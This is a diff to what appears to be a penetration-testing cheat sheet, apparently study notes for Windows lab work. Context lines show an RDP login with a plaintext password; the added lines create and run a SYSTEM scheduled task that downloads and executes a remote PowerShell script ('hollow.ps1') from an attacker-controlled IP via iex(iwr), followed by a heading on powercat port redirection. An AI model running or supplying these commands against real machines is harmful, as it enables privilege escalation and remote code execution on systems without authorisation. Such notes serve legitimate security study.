@@ -31,3 +31,10 @@ Using netexec:
 
 ### <ins>RDP to host using xfreerdp</ins>:
 - `xfreerdp /v:172.16.231.221 /u:amit /p:'Password123!' +dynamic-resolution +clipboard`
+
+# Escalate to SYSTEM via Schduele Task
+- `schtasks /create /tn "SystemTask" /tr "powershell iex(iwr http://192.168.45.223/hollow.ps1 -useb)" /sc once /st 00:00 /ru SYSTEM`
+
+- `schtasks /run /tn "SystemTask"`
+
+# TCP Port Redirection via powercat.ps1
